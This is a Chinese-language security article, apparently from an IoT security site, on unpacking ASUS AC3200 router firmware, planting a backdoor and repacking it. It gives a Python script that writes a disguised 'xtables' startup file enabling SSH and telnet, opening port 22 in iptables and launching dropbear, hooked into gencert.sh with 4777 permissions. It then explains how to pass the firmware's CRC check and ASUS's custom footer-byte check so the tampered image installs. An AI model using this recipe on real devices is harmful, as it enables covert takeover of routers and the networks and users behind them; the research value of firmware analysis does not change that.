# 华硕AC系列固件重打包与后门植入
> ChaMd5
> 来源：https://www.iotsec-zone.com/article/361

写在前面：华硕AC系列固件设备数量很多，因此具有一定的固件重打包和后门植入的价值，这篇文章对华硕AC系列固件进行了分析，并研究了其重打包方法。本篇文章以华硕AC3200固件为例。

#### 1.固件解包及基本结构解析
首先用binwalk对华硕AC3200固件进行扫描：

![0.png](https://www.iotsec-zone.com/images/MdImg/3dc75c758cdca7fa0ee8b2e3d51ef640.png)

由binwalk扫描发现固件由3部分组成：TRX头、内核以及文件系统构成。再拿firmware-mod-kit也解包扫描一下，最终可以发现其实这个固件是由4部分组成，文件系统中包含FOOTER字段（其实FOOTER字段就是文件系统的一部分）：

1.TRX头
2.内核：偏移是0x1C，范围是0x1C-0x1AFD23
3.文件系统：偏移是0x1AFD24，范围是0x1AFD24-0x26C2B7F
4.FOOTER：这个footer是binwalk扫描不出来的，是firmware-mod-kit扫描出来的，firmware-mod-kit这个算法很奇怪，总体来说就是从尾部向上找，当发现固件末尾都是00但是其中混杂着非00的信息时，就认为是有FOOTER的。FOOTER长度的计算方式也很有意思，从最末端开始向上找，每过一个字节，就+16，当找到那条非00的信息时结束。虽然不知道为什么这么计算，但是确实可以找到尾部的标志信息，具体的信息可以看一下firmware-mod-kit的具体算法，如图所示。拿winhex看一下固件，确实也发现了在尾部的FOOTER信息。

![1.png](https://www.iotsec-zone.com/images/MdImg/8c18a697ee153727e4097a73f1afd453.png)

![2.png](https://www.iotsec-zone.com/images/MdImg/25c01df4957c1262480433b5097e83dd.png)

固件解包可以直接用firmware-mod-kit实现：

```
./extract-firmware.sh RT-AC3200_3.0.0.4_382_51940-ga3b9d4a.trx

```

成功的进行了解包，解出来的文件系统存储在fmk文件夹下。下一步我们在该文件夹系统下添加后门，在这里直接在开机执行的shell脚本中添加我们需要执行的命令，在这里我们开启一个ssh连接，生成后门代码如下，功能即为开启ssh：

```
import os    
os.system("touch fmk/rootfs/usr/sbin/xtables")    
os.system("echo 'sleep 120' >> fmk/rootfs/usr/sbin/xtables")    
os.system("echo 'nvram set sshd_enable=1' >> fmk/rootfs/usr/sbin/xtables")    
os.system("echo 'nvram set sshd_port_x=22' >> fmk/rootfs/usr/sbin/xtables")    
os.system("echo 'nvram set sshd_port=22' >> fmk/rootfs/usr/sbin/xtables")    
os.system("echo 'nvram set telnetd_enable=1' >> fmk/rootfs/usr/sbin/xtables")    
os.system("echo 'nvram set sshd_pass=1' >> fmk/rootfs/usr/sbin/xtables")    
os.system("echo 'service start_telnetd' >> fmk/rootfs/usr/sbin/xtables")    
os.system("echo 'service start_sshd' >> fmk/rootfs/usr/sbin/xtables")    
os.system("echo 'sleep 10' >> fmk/rootfs/usr/sbin/xtables")    
os.system("echo 'iptables -I INPUT -p tcp --dport 22 -j ACCEPT' >> fmk/rootfs/usr/sbin/xtables")    
os.system("echo 'sleep 30' >> fmk/rootfs/usr/sbin/xtables")    
os.system("echo 'dropbear -a -p 22' >> fmk/rootfs/usr/sbin/xtables")    
os.system("chmod 4777 fmk/rootfs/usr/sbin/xtables")    
os.system("echo '/usr/sbin/xtables &' >> fmk/rootfs/usr/sbin/gencert.sh")

```

#### 2.固件打包
此时添加完后门后，我们利用firmware-mod-kit直接进行重打包：

```
./build_firmware.sh fmk/

```

这里直接进行重打包时，会报一个错误，如图：

![3.png](https://www.iotsec-zone.com/images/MdImg/d9c823a2864f08e398e605a46348d7fc.png)

由于加入了后门文件，导致现在的文件系统比原来的文件系统大，这样会重打包失败，因此我们可以缩减一下里面一些文件的大小，这里通过缩减所有图片的分辨率，来降低文件系统大小、

```
import os    
def search(root, target):        
    items = os.listdir(root)        
    for item in items:            
 path = os.path.join(root, item)            
 if os.path.isdir(path):                                
     search(path, target)            
        if target in path.split('/')[-1]:                
     os.system("convert " + path + " " + path + ".gif")                
     os.system("convert -strip -quality 75% " + path + ".gif " + path + ".gif")                
     os.system("rm " + path)                
     os.system("mv " + path + ".gif " + path)
search("fmk/rootfs/www/images/", ".png")

```
此时再次执行重打包，即可成功：

![4.png](https://www.iotsec-zone.com/images/MdImg/aedb299d9ff774bfd5a6b7145dfaf4dc.png)

#### 3.固件校验
进行完固件重打包后，固件在更新上传时会有校验，校验的函数在libshared.so文件中，名为check_imagefile。校验的关键代码如下：

![5.png](https://www.iotsec-zone.com/images/MdImg/5c8bad44b0ab5c6038909b53968547dc.png)

发现主要是对固件做了两个校验，分别是crc校验和trx校验。分别对这两个校验进行一下解析。首先看一下check_crc函数。其校验代码如下，作用即为检查trx头部的crc字段。

![6.png](https://www.iotsec-zone.com/images/MdImg/d6f42a6b3679f400e641fe25c99c859b.png)

其实crc字段在firmware-mod-kit打包时，就已经自动进行了更新，但是还是看一下其原理。check_crc这个函数主要就是为读取了一下TRX头，然后对其中的某些字段做了校验。TRX头部结构如下：

```
struct trx_header {
 uint32_t magic;  /* "HDR0" */
 uint32_t len;  /* Length of file including header */
 uint32_t crc32;  /* 32-bit CRC from flag_version to end of file */
 uint32_t flag_version; /* 0:15 flags, 16:31 version */
 uint32_t offsets[4]; /* Offsets of partitions from start of header */
};

```

由此可知，check_crc应该就是检查的TRX头部的crc32字段，其中crc32字段存放的应该就是从flag_version至文件尾的CRCC校验值。我们这里拿winhex做一下计算,发现计算结果和crc32字段不一致，其实固件里存放的crc32字段是该计算结果取反后的。

 

2进制(原码)	1001 0001 1000 1000 0001 1010 1101 1110
2进制(按位取反)	0110 1110 0111 0111 1110 0101 0010 0001
16进制(原码)	91881ADE
16进制(按位取反)	6E77E521

![7.png](https://www.iotsec-zone.com/images/MdImg/2f82041751b20ea89d39e5ada5442c7d.png)

第二个校验函数为check_trx函数，虽然名为check_trx，经过分析发现其是华硕自己设计的检查尾部某个字节的函数。这个函数的功能如下，看到其首先检查了一下trx头是否可读。将trx头部信息读取到了v8缓存中，根据v8和v9的栈上的偏移，可以得出v9即为trx头部信息的第二个字段，长度字段。因此可以得出v9>0x8fdc30，之后在固件中，分别选取了两个位置的字节（0x24E4和0x8FDC30）进行了计算，并同固件中的某个位置的值做检查。简而言之就是计算得到的v10，和其中原本存放的位置a2做检查，看是否相等。

![8.png](https://www.iotsec-zone.com/images/MdImg/19da12c566368c900bf51fafde0e8e1b.png)

![9.png](https://www.iotsec-zone.com/images/MdImg/b42fcc72b2a0cb9a91f5fb0bf0180f1f.png)

下面我们需要确定一下这个计算得到的字节，到底存放在固件的哪个位置，我们知道这个字节存放在a2参数中，因此查看他的父函数check_imagefile函数（图在前面粘过），发现在父函数中，对应的变量为v21。因此查看一下v21参数所在的栈位置。比较坑的是，在这里ida的解析出现了问题，解析出来了v3和v4两个指向FILE的指针，在这里结合Ghidra做一下分析：

![10.png](https://www.iotsec-zone.com/images/MdImg/4083564a3662d52edbb1f56a2c3c3325.png)

![11.png](https://www.iotsec-zone.com/images/MdImg/203750399f6f9970ad925e7b1e7d40b1.png)

根据分析可以发现，v3打开了文件后，用fseek做了一下指针的移动，注意根据fseek函数定义，该指针是从文件尾开始移动的。之后用fread读取了0x40个字节至v17空间。根据v17和v21在栈上的偏移得知，二者相差0x24，因此v21所在的字节就是从文件末尾起，0x40-0x24=0x1C处。也就是固件FOOTER字段里的最后一个非00值。

```
int fseek(FILE *stream, long int offset, int whence)
stream -- 这是指向 FILE 对象的指针，该 FILE 对象标识了流。
offset -- 这是相对 whence 的偏移量，以字节为单位。
whence -- 这是表示开始添加偏移 offset 的位置。它一般指定为下列常量之一：
SEEK_SET 文件的开头
SEEK_CUR 文件指针的当前位置
SEEK_END 文件的末尾

```

![12.png](https://www.iotsec-zone.com/images/MdImg/4471010a4ef9225526e4f2112a04fc9a.png)

综上，我们知道，华硕会对固件中指定位置（0x24E4和0x8FDC30）的两个字节做一个计算：将后面那个字节按位取反然后和前面字节相加相加，之后将这个值存放到文件尾部，作为固件的防护手段。
我们用原先的AC3200固件做一下检查，其0x24E4和0x8FDC30字段分别存放着0xD1和0x16，然后经过~0x16+0xD1计算得到0x1BA，取单字节为0xBA，计算正确，因此重打包后的文件系统，经过计算将该字节修改正确即可。

综上，实现了最终的固件重打包，华硕固件结构比较简单，简而言之就是TRX头部+内核+文件系统（包含FOOTER字段）。重打包时只需要打包对应文件系统，然后添加内核和TRX头部，并且通过CRC校验和华硕自己涉及的尾部校验即可。

-end
